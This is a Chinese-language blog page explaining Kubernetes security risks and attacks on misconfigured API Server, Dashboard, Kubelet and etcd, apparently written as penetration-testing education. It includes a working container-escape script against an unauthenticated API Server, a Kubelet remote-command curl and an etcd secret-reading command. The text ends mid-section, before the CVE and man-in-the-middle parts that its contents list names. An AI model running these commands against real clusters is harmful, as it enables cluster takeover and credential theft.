<!DOCTYPE html>
<html lang="zh-cn">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>K8s 安全 - Geekby&#39;s Blog</title><meta name="Description" content="容器编排平台的风险分析"><meta property="og:title" content="K8s 安全" />
<meta property="og:description" content="容器编排平台的风险分析" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-30T15:23:00+08:00" />
<meta property="article:modified_time" content="2021-12-07T17:28:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="K8s 安全"/>
<meta name="twitter:description" content="容器编排平台的风险分析"/>
<meta name="application-name" content="Geekby&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" /><link rel="prev" href="https://www.geekby.site/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/" /><link rel="next" href="https://www.geekby.site/2021/12/api%E5%AE%89%E5%85%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "K8s 安全",
        "inLanguage": "zh-cn",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/www.geekby.site\/2021\/11\/k8s%E5%AE%89%E5%85%A8\/"
        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "云原生安全, k8s","wordcount":  2737 ,
        "url": "https:\/\/www.geekby.site\/2021\/11\/k8s%E5%AE%89%E5%85%A8\/","datePublished": "2021-11-30T15:23:00+08:00","dateModified": "2021-12-07T17:28:00+08:00","publisher": {
            "@type": "Organization",
            "name": "Geekby","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
                    "width":  358 ,
                    "height":  330 
                }},"author": {
                "@type": "Person",
                "name": "Geekby"
            },"description": "容器编排平台的风险分析"
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">K8s 安全</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>云原生安全</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-30">2021-11-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2737 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-背景">1 背景</a>
      <ul>
        <li><a href="#11-kubernetes">1.1 Kubernetes</a></li>
        <li><a href="#12-组件接口存在的风险">1.2 组件接口存在的风险</a>
          <ul>
            <li><a href="#121-api-server">1.2.1 API Server</a></li>
            <li><a href="#122-dashboard">1.2.2 Dashboard</a></li>
            <li><a href="#123-kubelet">1.2.3 Kubelet</a></li>
            <li><a href="#124-etcd">1.2.4 etcd</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#2-k8s-组件配置不当的攻击案例">2 k8s 组件配置不当的攻击案例</a>
      <ul>
        <li><a href="#21-api-server-未授权访问">2.1 API Server 未授权访问</a></li>
        <li><a href="#22-dashboard-未授权访问">2.2 Dashboard 未授权访问</a></li>
        <li><a href="#23-kubelet-未授权访问">2.3 Kubelet 未授权访问</a></li>
      </ul>
    </li>
    <li><a href="#3-k8s-权限提升漏洞---cve-2018-1002105">3 k8s 权限提升漏洞 - CVE-2018-1002105</a>
      <ul>
        <li><a href="#31-背景">3.1 背景</a>
          <ul>
            <li><a href="#311-基于角色的访问控制---rbac">3.1.1 基于角色的访问控制 - RBAC</a></li>
            <li><a href="#312-websocket">3.1.2 WebSocket</a></li>
            <li><a href="#313-kubernetes-api-server">3.1.3 Kubernetes API Server</a></li>
          </ul>
        </li>
        <li><a href="#32-分析">3.2 分析</a></li>
        <li><a href="#33-复现">3.3 复现</a>
          <ul>
            <li><a href="#331-前置条件">3.3.1 前置条件</a></li>
            <li><a href="#332-漏洞环境搭建">3.3.2 漏洞环境搭建</a></li>
            <li><a href="#333-漏洞复现">3.3.3 漏洞复现</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#4-k8s-中间人攻击">4 k8s 中间人攻击</a>
      <ul>
        <li><a href="#41-背景">4.1 背景</a></li>
        <li><a href="#42-场景">4.2 场景</a>
          <ul>
            <li><a href="#421-mitm-需要的网络权限">4.2.1 MITM 需要的网络权限</a></li>
            <li><a href="#422-k8s-与-dns">4.2.2 k8s 与 DNS</a></li>
            <li><a href="#423-k8s-与-arp">4.2.3 k8s 与 ARP</a></li>
          </ul>
        </li>
        <li><a href="#43-原理">4.3 原理</a></li>
        <li><a href="#44-复现">4.4 复现</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="k8s-安全">K8s 安全</h1>
<h2 id="1-背景">1 背景</h2>
<blockquote>
<p>Kubernetes，简称为 K8s，是一个开源的容器化应用自动部署、伸缩和管理平台，已经成为容器编排的事实标准。</p>
</blockquote>
<h3 id="11-kubernetes">1.1 Kubernetes</h3>
<p>一个 Kubernetes 集群包含若干台服务器。其中，用于运行容器化应用的服务器被称为工作节点（worker node）；</p>
<p>用于运行控制平面（control plane）组件的服务器被称为控制节点或主节点（master node）。</p>
<p>在计算资源充足的情况下，工作节点和控制节点并不重合，控制平面组件只运行在控制节点上，业务容器运行在工作节点上，以满足高可用的需求。然而，为了达到充分利用服务器资源的目的（或单节点集群的情况），有时也会允许控制节点上运行业务容器。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302020793.png-water_print" /></p>
<p>其中，Master Node 中包含：</p>
<ul>
<li><code>API Server</code></li>
</ul>
<p>这是 Kubernetes 控制面板中唯一带有用户可访问 API 以及用户可交互的组件。API 服 务器会暴露一个 RESTful 的 Kubernetes API 并使用 JSON 格式的清单文件(manifest files)。</p>
<ul>
<li><code>etcd</code></li>
</ul>
<p>这是一个强大的、稳定的、高可用的键值存储，被 Kubernetes 用于长久储存所有的 API 对象。</p>
<ul>
<li><code>Controller Manager</code></li>
</ul>
<p>被称为“kube-controller manager”，它运行着所有处理集群日常任务的控制器。包括了节点控制器、副本控制器、端点(endpoint)控制器以及服务账户等。</p>
<ul>
<li><code>Scheduler</code></li>
</ul>
<p>调度器会监控新建的 pods(一组或一个容器)并将其分配给节点。</p>
<p>在 Worker Node 中包含：</p>
<ul>
<li><code>Kubelet</code></li>
</ul>
<p>负责调度到对应节点的 Pod 的生命周期管理，执行任务并将 Pod 状态报告给主节 点的渠道，通过容器运行时(拉取镜像、启动和停止容器等)来运行这些容器。它 还会定期执行被请求的容器的健康探测程序。</p>
<ul>
<li><code>kube-proxy</code></li>
</ul>
<p>它负责节点的网络，在主机上维护网络规则并执行连接转发。它还负责对正在服务 的 pods 进行负载平衡。</p>
<p>在绿盟的<a href="https://mp.weixin.qq.com/s?subscene=19&amp;__biz=MzIyODYzNTU2OA==&amp;mid=2247487590&amp;idx=1&amp;sn=060a8bdf2ddfaff6ceae5cb931cb27ab&amp;chksm=e84fb6b9df383faf1723040a0d6f0300c9517db902ef0010e230d8e802b1dfe9d8b95e6aabbd" target="_blank" rel="noopener noreffer">针对容器的渗透测试方法</a>一文中指出一些渗透测试思路和方法。结合一般的渗透过程，梳理出一个针对 Kubernetes 的渗透测试流程：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202111302024222.png-water_print" /></p>
<p>Kubernetes 控制平面组件通常运行在控制节点上；另外，对容器逃逸后通常能够获得容器所在宿主机上的 root 权限。将这两点结合起来我们会发现，如果前期进行 Web 渗透的目标容器位于控制节点上，且成功从容器中逃逸，那么我们实际上能够凭借控制节点上的 Kubernetes 管理员凭证（kubeconfig）与 Kubernetes API Server 进行交互（甚至可以直接使用控制节点上的 kubectl 命令行工具）。</p>
<h3 id="12-组件接口存在的风险">1.2 组件接口存在的风险</h3>
<p>k8s 中的大多数组件以 HTTP 和 HTTPS 的 API 形式提供服务，常见端口如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">组件</th>
<th style="text-align:center">默认端口</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">API Server</td>
<td style="text-align:center">6443</td>
<td style="text-align:center">基于 HTTP 的安全端口</td>
</tr>
<tr>
<td style="text-align:center">API Server</td>
<td style="text-align:center">8080</td>
<td style="text-align:center">不安全的 HTTP 端口</td>
</tr>
<tr>
<td style="text-align:center">Kubelet</td>
<td style="text-align:center">10248</td>
<td style="text-align:center">检查健康状态的端口</td>
</tr>
<tr>
<td style="text-align:center">Kubelet</td>
<td style="text-align:center">10250</td>
<td style="text-align:center">面向 API Server 提供服务的 HTTPS 端口</td>
</tr>
<tr>
<td style="text-align:center">Dashboard</td>
<td style="text-align:center">8001</td>
<td style="text-align:center">提供 HTTP 服务的端口</td>
</tr>
<tr>
<td style="text-align:center">etcd</td>
<td style="text-align:center">2379</td>
<td style="text-align:center">客户端与服务端之间通信的端口</td>
</tr>
<tr>
<td style="text-align:center">etcd</td>
<td style="text-align:center">2380</td>
<td style="text-align:center">不同服务端之间通信的端口</td>
</tr>
</tbody>
</table>
<h4 id="121-api-server">1.2.1 API Server</h4>
<p>默认情况下，<code>API Server</code> 在 <code>8080</code> 和 <code>6443</code> 两个端口上提供服务。</p>
<p>其中，8080 端口提供的是没有 TLS 加密的 HTTP 服务，且所有到达该端口的请求将绕过所有认证和授权模块（但是仍然会被准入控制模块处理）。保留该端口主要是为了方便测试以及集群初启动。</p>
<p>然而在生产环境开放 8080 端口，即使绑定本地环回地址也是很危险的。如果将该端口暴露在互联网上，那么任何网络可达的攻击者都能够通过该端口直接与 <code>API Server</code> 交互，继而控制整个集群。</p>
<p>相比之下，6443 端口提供的是使用 TLS 加密的 HTTPS 服务，到达的请求必须通过认证和授权机制才能够被成功处理。在认证和授权机制配置正确的情况下，6443 端口提供的服务安全性会更高。</p>
<h4 id="122-dashboard">1.2.2 Dashboard</h4>
<p>在按照<a href="https://github.com/kubernetes/dashboard#install" target="_blank" rel="noopener noreffer">官方文档</a>所给方式部署完成 Dashboard 后，默认情况下，我们需要先执行 <code>kube proxy</code>，然后才能通过本地 8001 端口访问 Dashboard。但是，如果直接将 Dashboard
端口映射在宿主机节点上，或者在执行 <code>kube proxy</code> 指定了额外的地址参数，那么所有能够访到宿主机的用户，都能够直接访问 Dashboard。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 存在风险的配置方式</span>
kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s1">&#39;^*$&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>另外，默认情况下 Dashboard 需要登录认证，但是，如果用户在 Dashboard 的启动参数中添加了 <code>--enable-skip-login</code> 选项，那么攻击者就能够直接点击 Dashboard 界面的“跳过”，按钮，无须登录便可直接进入 Dashboard。</p>
<h4 id="123-kubelet">1.2.3 Kubelet</h4>
<p>API Server 是整个 Kubernetes 的中枢，以 RESTful API 的形式对外提供了大量应用接口。</p>
<p>事实上，Kubelet 也提供了 RESTful API 服务，供 API Server 调用以获取或改变某个  Kubernetes 节点上的资源状态。然而，这些 API 的设计意图并非是对外服务，因此官方并没有给出 Kubelet 的 API 文档。</p>
<p>默认配置下，Kubelet 在 10250 端口开放上述 API 服务，另外还监听 10248 端口，以供
其它组件检查 Kubelet 的运行状态：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl http://localhost:10248/healthz
</code></pre></td></tr></table>
</div>
</div><p>10248 端口的服务相对简单，不存在特别的风险。但10250 端口却存在一定风险。默认情况下 API Server 在访问 Kubelet 的API 时需要使用客户端证书，相对来说是比较安全的。但是如果出现以下任一情况：</p>
<ul>
<li>攻击者通过某种方式获取了 API Server 访问 Kubelet 的客户端证书。</li>
<li>用户为了方便起见，将 Kubelet 的 <code>--anonymous-auth</code> 参数设置为 <code>true</code>， 且 <code>authorization.mode</code> 设置为 <code>AlwaysAllow</code>。</li>
</ul>
<p>则网络可达的攻击者都能够直接与 Kubelet 进行交互，从而实现对其所在节点的控制。</p>
<h4 id="124-etcd">1.2.4 etcd</h4>
<p>Kubernetes 集群内的各种资源及其状态均存储在 etcd 中。如果能够有办法读取 etcd 中的数据，就可能获取高权限，从而控制集群。</p>
<p>目前，etcd 启动后监听 2379 和 2380 两个端口，前者用于客户端连接，后者用于多个 etcd 实例之间的端对端通信。在多节点集群中，为了实现高可用，etcd 往往在节点 IP 上进行监听，已实现多节点的互通。</p>
<p>默认情况下，两个端口提供的服务都需要相应证书才能访问，并禁止匿名访问，来保证安全性。如果攻击者获取了证书，或者允许匿名访问，就可以直接获取 ectd 内的数据。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">etcdctl --endpoints https://localhost:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/serviceaccounts/kube-system/default -o json
</code></pre></td></tr></table>
</div>
</div><h2 id="2-k8s-组件配置不当的攻击案例">2 k8s 组件配置不当的攻击案例</h2>
<h3 id="21-api-server-未授权访问">2.1 API Server 未授权访问</h3>
<p>默认情况下，API Server 能够在两个端口上对外提供服务：<code>8080</code> 和 <code>6443</code>，前者以 HTTP 提供服务，无认证和授权机制；后者以 HTTPS 提供服务，支持认证和授权服务。在较新版本的 Kubernetes 中，<code>8080</code> 端口的 HTTP 服务默认不启动。然而，如果用户在 <code>/etc/kubernets/manifests/kube-apiserver.yaml</code> 中将 <code>--insecure-port=0</code> 修改为 <code>--insecure-port=8080</code> ，并重启 API Server，那么攻击者只要网络可达，都能够通过此端口操控集群。</p>
<p>如远程列出目标机器上运行的 pod：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl -s <span class="nv">$TARGETIP</span>:8080 get pod
</code></pre></td></tr></table>
</div>
</div><p>进一步创建挂载宿主机目录的 Pod 进行容器逃逸，获得宿主机权限，相关操作如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
cat <span class="s">&lt;&lt; EOF &gt; escape.yaml
</span><span class="s"># attacker.yaml
</span><span class="s">apiVersion: v1
</span><span class="s">kind: Pod
</span><span class="s">metadata:
</span><span class="s">  name: attacker
</span><span class="s">spec:
</span><span class="s">  containers:
</span><span class="s">  - name: ubuntu
</span><span class="s">    image: ubuntu:latest
</span><span class="s">    imagePullPolicy: IfNotPresent
</span><span class="s">    # Just spin &amp; wait forever
</span><span class="s">    command: [ &#34;/bin/bash&#34;, &#34;-c&#34;, &#34;--&#34; ]
</span><span class="s">    args: [ &#34;while true; do sleep 30; done;&#34; ]
</span><span class="s">    volumeMounts:
</span><span class="s">    - name: escape-host
</span><span class="s">      mountPath: /host-escape-door
</span><span class="s">  volumes:
</span><span class="s">    - name: escape-host
</span><span class="s">      hostPath:
</span><span class="s">        path: /
</span><span class="s">EOF</span>

kubectl -s TARGET-IP:8080 apply -f escape.yaml
sleep <span class="m">8</span>
kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
</code></pre></td></tr></table>
</div>
</div><h3 id="22-dashboard-未授权访问">2.2 Dashboard 未授权访问</h3>
<p>Kubernetes Dashboard 是一个基于 Web 的 Kubernetes 用户界面。借助 Dashboard，能够获得当前集群中应用运行状态的概览，创建或修改 Kubernetes 资源。</p>
<p>根据<a href="https://github.com/kubernetes/dashboard#install" target="_blank" rel="noopener noreffer">官方文档</a>，可以使用以下命令部署 Dashboard:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml
</code></pre></td></tr></table>
</div>
</div><p>Dashboard 需要配置 token 才能够访问，但是提供了「跳过」选项。从 1.10.1 版本起，Dashboard 默认禁用了「跳过」按钮。然而，如果用户在运行 Dashboard 时添加了 <code>--enable-skip-login</code>，那么攻击者只要网络可达，就能进入 Dashboard：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011541799.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011523353.png-water_print" /></p>
<p>使用上面的 <code>recommended.yaml</code> 创建 Dashboard 是可靠的。即使攻击者“跳过”认证直接登录，也几乎没有办法操作。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011554221.png-water_print" /></p>
<h3 id="23-kubelet-未授权访问">2.3 Kubelet 未授权访问</h3>
<p>在一个 Kubernetes 集群中，Kubelet 是主要的节点代理，运行在集群的每个节点上。它负责向 API Server 注册所在节点。</p>
<p>Kubelet 的配置文件是 <code>/var/lib/kubelet/config.yaml</code>。一般来说，我们在安装 Kubernetes 时会将 <code>--anonymous-auth</code> 设置为 <code>false</code>，并在 <code>authorization</code> 中选择 <code>mode</code> 为 <code>Webhook</code>。前一选项禁止匿名用户访问，后一选项则使 Kubelet 通过 API Server 进行授权（即使匿名用户能够访间，也几乎不具备任何权限)。</p>
<p>但是，一旦 <code>--anonymous-auth</code> 被设置为 <code>true</code>, 且 <code>authorization.mode</code> 被设置为  <code>AlwaysAllow</code> 这就非常危险了。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011612085.png-water_print" /></p>
<p>更改 config 文件后，重启 Kubelet：<code>systemctl restart kubelet</code>。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011619890.png-water_print" /></p>
<p>执行 <code>curl -k -XPOST &quot;https://nodeip:10250/run/%namespace%/%pod_name%/%container_name%&quot; -d &quot;cmd=ls -la /&quot;</code> 可以在对应容器里执行命令。</p>
<p>现在问题变成了如何确定 namespace、pod_name、container_name。访问 <code>https://nodeip:10250/pods</code> 。在 <code>metadata.namespace</code> 下的值为 <code>namespace</code>, <code>metadata.name</code> 下的值为 <code>pod_name</code>，<code>spec.containers</code> 下的 <code>name</code> 值为 <code>container_name</code>。</p>
<p>执行命令：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011644559.png-water_print" /></p>
<p>获取 Token：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112011647743.png-water_print" /></p>
<p>通过 Token 获取 API Server 权限：</p>
